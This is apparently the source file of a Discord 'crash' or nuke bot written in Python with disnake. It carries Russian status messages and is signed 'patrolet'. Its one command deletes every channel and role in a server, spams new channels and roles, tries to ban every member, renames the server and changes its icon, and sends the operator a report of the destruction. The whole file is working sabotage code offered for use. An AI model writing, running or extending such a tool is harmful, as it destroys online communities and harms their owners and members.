import os
import disnake
from asyncio import create_task
from const import TOKEN, CHANNEL_AND_ROLE_COUNT
from disnake.ext import commands
from func import crashobj, spamchannel, spamrole

bot = commands.Bot(command_prefix="!", help_command=None, intents=disnake.Intents.all())

@bot.command()
async def crash(ctx):
    works = []
    batable = []
    _guild = ctx.guild.name
    for _c in ctx.guild.channels:
        create_task(crashobj(obj=_c))
    works.append("1. Каналы удалены")
    for _r in ctx.guild.roles:
        create_task(crashobj(obj=_r))
    works.append("2. Роли удалены")
    for _cr in range(CHANNEL_AND_ROLE_COUNT):
        create_task(spamchannel(ctx))
        create_task(spamrole(ctx))
    works.append("3. Полный спам выполнен")
    for _m in ctx.guild.members:
        _tag = _m.name
        _id = _m.id
        try:
            await ctx.guild.ban(_m, reason="Crash by patrolet")
            batable.append(f'Попытка забанить {_tag} [{_id}]: успешно')
        except disnake.Forbidden:
            batable.append(f'Попытка забанить {_m} [{_id}]: без успеха (высокие права)')
        except Exception as e:
            batable.append(f'Попытка забанить {_m} [{_id}]: {e}')
    works.append("4. Баны выданы (вложение)")
    banlist = open('banlist.txt', 'w')
    for _key in batable:
        banlist.write(_key + "\n")
    banlist.close()
    with open('avatar.png', 'rb') as f:
        avatar = f.read()
        await ctx.guild.edit(name='Crashed by patrolet',icon=avatar)
    works.append("5. Название и аватарка сервера изменены")
    await ctx.author.send(f'# Краш: {_guild} | {ctx.guild.id}\n{works[0]}\n{works[1]}\n{works[2]}\n{works[3]}\n{works[4]}', file=disnake.File("banlist.txt"))
    os.remove('banlist.txt')

bot.run(TOKEN)